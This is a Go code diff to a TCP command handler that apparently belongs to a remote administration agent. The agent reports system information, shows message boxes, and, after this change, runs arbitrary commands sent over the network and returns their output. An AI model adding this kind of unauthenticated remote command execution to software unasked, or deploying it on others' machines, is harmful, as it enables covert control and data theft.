@@ -46,7 +46,7 @@ func handleClient(conn net.Conn) {
 		split_message := strings.Split(message, DELIM)
 		command := split_message[0]
 
-		fmt.Printf("[%s] [RECEIVED] %s\r\n", conn.RemoteAddr(), command)
+		fmt.Printf("[%s <- Received] %s\r\n", strings.Split(conn.RemoteAddr().String(), ":")[0], split_message)
 
 		switch command {
 		case "get_pc_info":
@@ -65,7 +65,6 @@ func handleClient(conn net.Conn) {
 
 			send([]string{command, hostname, ipAddress, os_version}, conn)
 		case "show_messagebox":
-			fmt.Println(message)
 			message, _ := syscall.UTF16PtrFromString(string(split_message[1]))
 			title, _ := syscall.UTF16PtrFromString(string(split_message[2]))
 			buttons, _ := strconv.Atoi(split_message[3])
@@ -82,7 +81,21 @@ func handleClient(conn net.Conn) {
 		case "run_process":
 			process_name := string(split_message[1])
 			params := strings.Split(process_name, " ")
-			go exec.Command(params[0], params[1:]...).Output()
+			fmt.Println(params, len(params))
+			var b []byte
+			var err error
+			if len(params) == 1 {
+				b, err = exec.Command(params[0]).Output()
+				fmt.Println(string(b), err)
+			} else {
+				b, err = exec.Command(params[0], params[1:]...).Output()
+			}
+
+			if err != nil {
+				send([]string{"run_process", process_name, "false", err.Error()}, conn)
+			} else {
+				send([]string{"run_process", process_name, "true", string(b)}, conn)
+			}
 		}
 
 	}
@@ -109,5 +122,8 @@ func send(message []string, conn net.Conn) error {
 	formattedMessage := strings.Join(message, DELIM)
 	finalMessage := []byte(fmt.Sprintf("%-10d%s", len(formattedMessage), formattedMessage))
 	_, err := conn.Write(finalMessage)
+	if err == nil {
+		fmt.Printf("[%s -> Sent] %s\r\n", strings.Split(conn.RemoteAddr().String(), ":")[0], message)
+	}
 	return err
 }
